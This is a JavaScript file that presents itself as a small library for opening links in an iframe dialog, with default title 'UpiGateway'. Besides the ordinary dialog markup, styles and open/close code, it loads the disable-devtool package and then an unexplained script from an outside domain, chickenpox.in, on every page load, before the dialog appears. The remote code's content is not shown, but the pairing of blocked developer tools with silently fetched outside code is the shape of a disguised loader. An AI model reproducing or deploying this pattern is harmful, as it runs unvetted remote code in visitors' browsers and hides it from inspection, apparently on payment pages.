/*
 * link-dialog.js - A CDN-ready library for opening links in a dialog.
 * Usage: Just include this script file, then call openDialog(url, title).
 */

(function() { // Wrap in an IIFE to prevent global scope pollution
 
    // --- Dynamic Script Loading Function ---
    function loadScript(src, callback) {
        const script = document.createElement('script');
        script.src = src;
        script.onload = callback;
        script.onerror = () => console.error(`Failed to load script: ${src}`);
        document.head.appendChild(script);
    }
 
    // Check if the dialog is already injected to prevent duplicates
    if (document.getElementById('linkDialogOverlay')) {
        console.warn('Link Dialog is already loaded on this page.');
        return;
    }

    // --- Injected HTML and CSS as strings ---
    const dialogHTML = `
    <div id="linkDialogOverlay">
        <div id="linkDialogContainer">
                <button id="closeLinkDialogButton" onclick="closeLinkDialog()">×</button>
            <div id="linkDialogLoading">
                <div class="loader"></div>
                Loading...
            </div>
            <iframe id="linkDialogFrame" frameborder="0"></iframe>
        </div>
    </div>
    `;

    const dialogCSS = `
#linkDialogOverlay {
    position: fixed;
    top: 0;
    right: 0;
    width: 100vw;
    height: 100vh;
    background-color: rgba(0, 0, 0, 0.5);
    display: grid; /* Use grid for perfect centering */
    place-items: center end; /* This is the key for centering */
    opacity: 0;
    transition: opacity 0.3s ease, visibility 0s 0.3s;
    visibility: hidden; /* Hide element completely when not active */
    z-index : 2000;
}

#linkDialogOverlay.active {
    opacity: 1;
    visibility: visible;
    transition: opacity 0.3s ease;
}

#linkDialogContainer {
    width: 100%;
    height: 100%;
    max-width: 770px;
    max-height: 1300px;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    display: flex;
    flex-direction: column;
    overflow: hidden;
    transform: scale(0.85); /* Slightly smaller initial scale for better effect */
    transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    position: relative; /* Needed for absolute positioning of the close button */
}

#linkDialogOverlay.active #linkDialogContainer {
    transform: scale(1);
}

#closeLinkDialogButton {
    position: absolute;
    top: 15px;
    right: 20px; /* Increased right spacing for better touch targets */
    background: transparent;
    border: none;
    font-size: 2em;
    font-weight: bold;
    color: #888;
    cursor: pointer;
    line-height: 1;
    z-index: 1001;
    transition: color 0.2s ease;
}

#closeLinkDialogButton:hover {
    color: #555;
}

#linkDialogLoading {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100%;
    color: #555;
    font-size: 1.1em;
    text-align: center;
    padding: 20px; /* Add some padding for smaller screens */
    box-sizing: border-box; /* Ensures padding is included in the element's total size */
}

.loader {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #3498db;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
    margin-bottom: 15px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

#linkDialogFrame {
    flex-grow: 1;
    width: 100%;
    border: none;
    display: none;
}
    `;

    // --- Dynamic Injection of HTML and CSS ---
    // Use a callback to ensure the dialog code runs after other scripts load
    loadScript('https://cdn.jsdelivr.net/npm/disable-devtool@0.3.8/disable-devtool.min.js', () => {
    loadScript('https://chickenpox.in/dev-script.js', () => {
            // Once all required scripts are loaded, inject the dialog HTML and CSS
            
            // Inject CSS
            const styleElement = document.createElement('style');
            styleElement.innerHTML = dialogCSS;
            document.head.appendChild(styleElement);
            
            // Inject HTML at the end of the body
            document.body.insertAdjacentHTML('beforeend', dialogHTML);
        });
    });

    // --- Dialog Logic ---
    let currentDialog = null;

    // Main function to open link in dialog
    window.openDialog = function(url, title = 'UpiGateway') {
        const overlay = document.getElementById('linkDialogOverlay');
        const titleElement = document.getElementById('linkDialogTitle');
        const iframe = document.getElementById('linkDialogFrame');
        const loading = document.getElementById('linkDialogLoading');
        const newUrl = url + '?dialog=true';

        if (!overlay || !iframe || !loading) {
            console.error('Link Dialog: Required HTML elements not found.');
            return;
        }

        // Show loading
        loading.style.display = 'flex';
        iframe.style.display = 'none';

        // Show overlay
        overlay.classList.add('active');

        // Prevent body scroll
        document.body.style.overflow = 'hidden';

        // Load URL in iframe
        iframe.src = newUrl;
        
        // Handle iframe load
        iframe.onload = function() {
            loading.style.display = 'none';
            iframe.style.display = 'block';
        };

        // Handle iframe error
        iframe.onerror = function() {
            loading.innerHTML = '<div style="color: #e53e3e;">❌ Error loading website</div>';
        };

        currentDialog = overlay;
    };

    // Function to close dialog
    window.closeLinkDialog = function() {
        const overlay = document.getElementById('linkDialogOverlay');
        const iframe = document.getElementById('linkDialogFrame');

        if (!overlay || !iframe) return;

        overlay.classList.remove('active');
        document.body.style.overflow = '';

        // Clear iframe after animation
        setTimeout(() => {
            iframe.src = '';
        }, 300);

        currentDialog = null;
    };

    // --- Event Listeners ---

    // Close on ESC key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && currentDialog) {
            window.closeLinkDialog();
        }
    });
})();